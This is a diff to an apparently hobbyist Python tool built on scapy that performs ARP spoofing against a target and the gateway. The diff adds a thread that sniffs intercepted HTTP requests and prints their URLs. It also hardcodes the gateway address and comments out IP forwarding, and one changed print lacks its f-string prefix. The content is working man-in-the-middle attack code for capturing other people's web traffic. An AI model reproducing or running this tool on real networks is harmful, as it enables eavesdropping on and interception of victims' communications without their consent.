@@ -3,6 +3,7 @@ import ctypes
 import scapy.all as scapy
 import argparse
 import network
+from scapy.layers import http
 import time
 import os
 import _thread
@@ -47,23 +48,35 @@ def restore(target_ip, source_ip):
     scapy.send(packet, count=4, verbose=False)
 
 
+def pkt_callback(pkt):
+    if pkt.haslayer(http.HTTPRequest):
+        http_request = pkt.getlayer(http.HTTPRequest)
+        url = http_request.Host + http_request.Path
+        print(url)
+
+
+def sniff():
+    scapy.sniff(prn=pkt_callback, store=0)
+
+
 def arp_spoofing(target):
     # Check the current net config to get the gateway info
-    network_commands = network.NetworkCommands()
-    ip_gateway = network_commands.find_gateway()
+    #network_commands = network.NetworkCommands()
+    ip_gateway = "10.0.2.1" #network_commands.find_gateway()
     mac_gateway = request_mac(ip_gateway)
 
-    print("[+] Default gateway is", ip_gateway, "with", mac_gateway)
+    print(f"[+] Default gateway is{ip_gateway} with {mac_gateway}")
 
     # Get Target info
     mac_target = request_mac(target)
 
-    print("[+] Target is", target, "with", mac_target)
+    print("[+] Target is{target} with {mac_target}")
 
-    network_commands.set_ipv4_forwarding(True)
+    #network_commands.set_ipv4_forwarding(True)
 
     keys = []
     _thread.start_new(input_thread, (keys,))
+    _thread.start_new(sniff, ())
     print("[!]", "Press Enter to stop attack!")
 
     arp_counter = 0
@@ -74,7 +87,7 @@ def arp_spoofing(target):
 
         arp_counter += 2
 
-        print("\r[+] Send ARP " + str(arp_counter), end=" ", flush=True)
+        print(f"\r[+] Send ARP {str(arp_counter)}", end=" ", flush=True)
 
         time.sleep(2)
 
@@ -82,7 +95,7 @@ def arp_spoofing(target):
             break
 
     print("\n[-] Detected 'Enter' ... Resetting ARP tables")
-    network_commands.set_ipv4_forwarding(False)
+    #network_commands.set_ipv4_forwarding(False)
     restore(ip_gateway, target)
     restore(target, ip_gateway)
 
